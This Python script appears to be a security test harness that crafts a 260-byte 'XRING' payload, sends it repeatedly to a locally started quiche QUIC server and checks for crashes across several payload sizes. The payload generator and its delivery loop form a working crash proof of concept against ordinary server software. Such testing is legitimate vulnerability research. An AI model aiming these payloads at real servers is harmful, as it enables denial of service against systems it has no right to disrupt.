#!/usr/bin/env python3
"""
QUIC XRING Dynamic Test Suite - Advanced
Tests attack behavior on quiche-server with live traffic
"""

import subprocess
import sys
import os
import json
import tempfile
import signal
import time
from pathlib import Path
from dataclasses import dataclass, asdict
from typing import Optional, Dict
from datetime import datetime

# Configuration
QUICTE_SERVER = "/opt/homebrew/bin/quiche-server"
QUICTE_CLIENT = "/opt/homebrew/bin/quiche-client"
SERVER_PORT = 4433
SERVER_HOST = "127.0.0.1"
TEMP_DIR = tempfile.mkdtemp(prefix="quic_advanced_test_")
CERT_DIR = f"{TEMP_DIR}/certs"
PAYLOAD_FILE = f"{TEMP_DIR}/xring_payload.bin"

@dataclass
class TestResult:
    timestamp: str
    test_name: str
    status: str
    details: Dict
    crash_detected: bool = False
    memory_violation: bool = False

    def to_dict(self):
        return asdict(self)

class AdvancedTestHarness:
    def __init__(self):
        self.server_process = None
        self.results = []
    
    def generate_certs(self) -> str:
        """Generate certificates for quiche-server"""
        os.makedirs(CERT_DIR, exist_ok=True)
        
        subprocess.run([
            "openssl", "genrsa", "-out", f"{CERT_DIR}/server.key", "2048"
        ], capture_output=True)
        
        subprocess.run([
            "openssl", "req", "-new", "-x509",
            "-key", f"{CERT_DIR}/server.key",
            "-out", f"{CERT_DIR}/server.crt",
            "-days", "365",
            "-subj", "/CN=localhost"
        ], capture_output=True)
        
        return f"{CERT_DIR}/server.crt"
    
    def generate_payload(self) -> bytes:
        """Generate 260-byte XRING payload"""
        payload = bytearray()
        payload.extend([0x20, 0x40])
        for _ in range(61):
            payload.extend([0x40, 1, ord('x'), 0])
        payload.extend([0x40, 5, ord('A'), ord('A'), ord('A'), ord('A'), ord('A'), 
                       5, ord('B'), ord('B'), ord('B'), ord('B'), ord('B')])
        payload.extend([0x20, 0x41])
        payload = payload[:260]
        
        with open(PAYLOAD_FILE, "wb") as f:
            f.write(payload)
        
        return bytes(payload)
    
    def start_server(self, port: int = SERVER_PORT) -> bool:
        """Start quiche-server with monitoring"""
        print(f"\n🚀 Starting quiche-server on port {port}...")
        
        try:
            self.server_process = subprocess.Popen(
                [
                    QUICTE_SERVER,
                    f"--listen={SERVER_HOST}:{port}",
                    f"--cert={CERT_DIR}/server.crt",
                    f"--key={CERT_DIR}/server.key",
                    f"--root={TEMP_DIR}/",
                    "--idle-timeout=10000"
                ],
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True
            )
            
            # Wait for server to be ready
            time.sleep(3)
            
            if self.server_process.poll() is None:
                print("✅ Server started successfully")
                
                # Check for memory violations
                if self.server_process.stdout:
                    line = self.server_process.stdout.readline()
                    if "panicked" in line.lower() or "error" in line.lower():
                        print("⚠️ Server reports errors:", line)
                        return False
                
                return True
            else:
                print("❌ Server failed to start")
                return False
                
        except Exception as e:
            print(f"❌ Error starting server: {e}")
            return False
    
    def stop_server(self):
        """Stop quiche-server gracefully"""
        if self.server_process:
            self.server_process.terminate()
            try:
                self.server_process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.server_process.kill()
            self.server_process = None
    
    def run_attack_sequence(self, payload: bytes) -> TestResult:
        """Execute XRING attack sequence"""
        print("\n🎯 Running XRING attack sequence...")
        
        start_time = time.time()
        
        # Send payload via file upload
        try:
            result = subprocess.run(
                [
                    QUICTE_CLIENT,
                    f"--trust-origin-ca-pem={CERT_DIR}/server.crt",
                    "--no-verify",
                    "--body", PAYLOAD_FILE,
                    f"https://{SERVER_HOST}:{SERVER_PORT}/upload"
                ],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            response_time = (time.time() - start_time) * 1000
            
            # Check server status
            server_alive = self.server_process and self.server_process.poll() is None
            
            print(f"Client response: exit code {result.returncode}")
            if result.stdout:
                print(f"STDOUT (first 200): {result.stdout[:200]}")
            if result.stderr:
                print(f"STDERR (first 200): {result.stderr[:200]}")
            
            return TestResult(
                timestamp=datetime.now().isoformat(),
                test_name="xring_attack",
                status="completed" if server_alive else "crashed",
                details={
                    "response_time_ms": round(response_time, 2),
                    "server_alive": server_alive,
                    "payload_size": len(payload),
                    "exit_code": result.returncode
                },
                crash_detected=not server_alive
            )
            
        except subprocess.TimeoutExpired:
            print("❌ Attack timed out")
            self.stop_server()
            return TestResult(
                timestamp=datetime.now().isoformat(),
                test_name="xring_attack",
                status="error",
                details={"error": "Timeout"},
                crash_detected=True,
                memory_violation=True
            )
        except Exception as e:
            print(f"❌ Attack failed: {e}")
            return TestResult(
                timestamp=datetime.now().isoformat(),
                test_name="xring_attack",
                status="error",
                details={"error": str(e)},
                crash_detected=False
            )
    
    def run_memory_stress_test(self, payload: bytes) -> TestResult:
        """Test memory stability with repeated attacks"""
        print("\n🧪 Running memory stress test...")
        
        start_time = time.time()
        
        for i in range(5):
            print(f"Attack attempt {i+1}/5...")
            
            try:
                result = subprocess.run(
                    [
                        QUICTE_CLIENT,
                        f"--trust-origin-ca-pem={CERT_DIR}/server.crt",
                        "--no-verify",
                        "--body", PAYLOAD_FILE,
                        f"https://{SERVER_HOST}:{SERVER_PORT}/test"
                    ],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                
                time.sleep(1)
                
            except Exception as e:
                print(f"Attempt {i+1} failed: {e}")
                # Continue anyway
            
            # Check server health
            if i == 4 and (self.server_process is None or self.server_process.poll() is not None):
                print("❌ Server crashed during stress test")
                self.stop_server()
                return TestResult(
                    timestamp=datetime.now().isoformat(),
                    test_name="memory_stress",
                    status="crashed",
                    details={"attempts": i+1},
                    crash_detected=True
                )
        
        response_time = (time.time() - start_time) * 1000
        
        return TestResult(
            timestamp=datetime.now().isoformat(),
            test_name="memory_stress",
            status="completed",
            details={
                "response_time_ms": round(response_time, 2),
                "attempts": 5,
                "server_still_running": True
            },
            crash_detected=False
        )
    
    def run_payload_size_analysis(self) -> TestResult:
        """Test different payload sizes to find threshold"""
        print("\n📊 Running payload size analysis...")
        
        sizes = [256, 260, 264, 512, 1024]
        results = []
        
        for size in sizes:
            # Generate payload of specific size
            test_payload = bytearray(256)
            test_payload.extend([0x20, 0x40])
            test_payload = test_payload[:size]
            
            test_file = f"{TEMP_DIR}/test_payload_{size}.bin"
            with open(test_file, "wb") as f:
                f.write(test_payload)
            
            print(f"Testing size {size} bytes...")
            
            try:
                result = subprocess.run(
                    [
                        QUICTE_CLIENT,
                        f"--trust-origin-ca-pem={CERT_DIR}/server.crt",
                        "--no-verify",
                        "--body", test_file,
                        f"https://{SERVER_HOST}:{SERVER_PORT}/test"
                    ],
                    capture_output=True,
                    text=True,
                    timeout=10
                )
                
                server_alive = self.server_process and self.server_process.poll() is None
                
                results.append({
                    "size": size,
                    "exit_code": result.returncode,
                    "server_alive": server_alive,
                    "success": result.returncode == 0 and server_alive
                })
                
                time.sleep(1)
                
            except Exception as e:
                results.append({
                    "size": size,
                    "error": str(e),
                    "success": False
                })
        
        return TestResult(
            timestamp=datetime.now().isoformat(),
            test_name="payload_size_analysis",
            status="completed",
            details={"results": results}
        )
    
    def run_full_test_suite(self):
        """Execute complete test suite"""
        print("=" * 60)
        print("QUIC XRING DYNAMIC TEST SUITE - ADVANCED")
        print("=" * 60)
        
        # Generate certificates and payload
        print("\n🔧 Preparing test environment...")
        self.generate_certs()
        payload = self.generate_payload()
        print(f"✅ Payload generated: {len(payload)} bytes")
        
        # Start server
        if not self.start_server():
            return TestResult(
                timestamp=datetime.now().isoformat(),
                test_name="full_suite",
                status="failed",
                details={"error": "Server failed to start"}
            )
        
        # Test 1: Basic connectivity
        try:
            result = subprocess.run(
                [QUICTE_CLIENT, f"--trust-origin-ca-pem={CERT_DIR}/server.crt",
                 "--no-verify", f"https://{SERVER_HOST}:{SERVER_PORT}/"],
                capture_output=True, text=True, timeout=10
            )
            print(f"\n✅ Basic connectivity: {result.returncode}")
        except Exception as e:
            print(f"\n❌ Basic connectivity failed: {e}")
        
        # Test 2: XRING attack
        attack_result = self.run_attack_sequence(payload)
        self.results.append(attack_result)
        
        # Test 3: Memory stress
        stress_result = self.run_memory_stress_test(payload)
        self.results.append(stress_result)
        
        # Test 4: Payload size analysis
        size_result = self.run_payload_size_analysis()
        self.results.append(size_result)
        
        # Stop server
        self.stop_server()
        
        # Save results
        results_file = f"{TEMP_DIR}/advanced_test_results.json"
        with open(results_file, "w") as f:
            json.dump([r.to_dict() for r in self.results], f, indent=2)
        
        print("\n" + "=" * 60)
        print("TEST SUITE COMPLETED")
        print("=" * 60)
        for result in self.results:
            status = "✅" if result.status != "error" else "❌"
            print(f"{status} {result.test_name}: {result.status}")
        
        print(f"\n📄 Results saved to: {results_file}")
        return TestResult(
            timestamp=datetime.now().isoformat(),
            test_name="full_suite",
            status="completed",
            details={"tests": len(self.results)}
        )

if __name__ == "__main__":
    harness = AdvancedTestHarness()
    harness.run_full_test_suite()
